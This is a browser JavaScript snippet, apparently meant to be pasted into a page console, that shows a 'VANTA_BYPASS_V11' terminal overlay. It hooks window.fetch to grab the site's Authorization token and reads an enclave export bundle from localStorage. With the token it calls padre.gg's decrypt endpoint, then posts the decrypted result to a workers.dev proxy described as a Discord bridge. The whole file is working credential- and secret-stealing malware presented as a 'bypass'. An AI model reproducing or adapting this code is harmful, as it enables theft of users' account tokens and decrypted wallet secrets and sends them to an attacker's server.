(function() {
    const CONFIG = {
        proxy: "https://vanta-proxy.jdurrulo.workers.dev/", // Your Discord bridge
        decryptApi: "https://api.padre.gg/v2/enclave/decrypt"
    };

    const core = { auth: null, bundle: null };

    // 1. THE TERMINAL UI
    const initUI = () => {
        if (document.getElementById('v-root')) return;
        const ui = document.createElement('div');
        ui.id = 'v-root';
        ui.style = `position:fixed;top:20px;right:20px;width:320px;background:#050505;border:1px solid #00ff88;color:#00ff88;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #00ff8844;border-radius:8px;`;
        ui.innerHTML = `
            <div style="font-weight:bold;border-bottom:1px solid #222;padding-bottom:5px;margin-bottom:10px;">VANTA_BYPASS_V11</div>
            <div id="v-log" style="height:140px;overflow-y:auto;font-size:10px;background:#000;padding:5px;border:1px solid #111;"></div>
            <button id="v-exec" style="width:100%;background:#00ff88;color:#000;border:none;padding:10px;margin-top:10px;font-weight:bold;cursor:pointer;border-radius:4px;">EXECUTE FULL SCAN</button>
        `;
        document.body.appendChild(ui);
    };

    const log = (m) => {
        const l = document.getElementById('v-log');
        if (l) { l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }
    };

    // 2. THE BYPASS HOOK (Captures the Token)
    const setupHooks = () => {
        const _f = window.fetch;
        window.fetch = async (...args) => {
            const h = args[1]?.headers;
            if (h) {
                const token = (h instanceof Headers) ? h.get('Authorization') : h['Authorization'];
                if (token && !core.auth) {
                    core.auth = token;
                    log("AUTH_TOKEN: CAPTURED");
                    // Trigger Decrypt once we have the token
                    runFullBypass();
                }
            }
            return _f.apply(this, args);
        };
    };

    // 3. THE "DO EVERYTHING" LOGIC
    const runFullBypass = async () => {
        log("Searching Enclave...");
        
        // Find Bundle in LocalStorage
        const storageData = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!storageData) {
            log("ERROR: Bundle not found. Log in first.");
            return;
        }
        core.bundle = JSON.parse(storageData);
        log("BUNDLE: LOCATED");

        if (!core.auth) {
            log("Awaiting Auth... Click 'Profile' in the app.");
            return;
        }

        log("BYPASSING ENCLAVE...");
        const bundleId = Object.keys(core.bundle.bundles)[0];
        const payload = {
            bundle: core.bundle.bundles[bundleId].exportBundle,
            subOrgId: core.bundle.bundles[bundleId].subOrgId
        };

        try {
            const res = await fetch(CONFIG.decryptApi, {
                method: 'POST',
                headers: { 'Authorization': core.auth, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const resultText = await res.text();
            log("DATA DECRYPTED.");

            // Exfiltrate to Discord
            fetch(CONFIG.proxy, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ status: "SUCCESS", data: resultText })
            });
            log("TRANSMISSION SENT.");
        } catch (e) {
            log("EXECUTION ERROR: " + e.message);
        }
    };

    // INIT
    initUI();
    setupHooks();
    document.getElementById('v-exec').onclick = () => {
        log("Forcing network sync...");
        // This forces the site to send the auth header to our hook
        fetch('/api/v2/user/profile').catch(() => {});
    };
})();
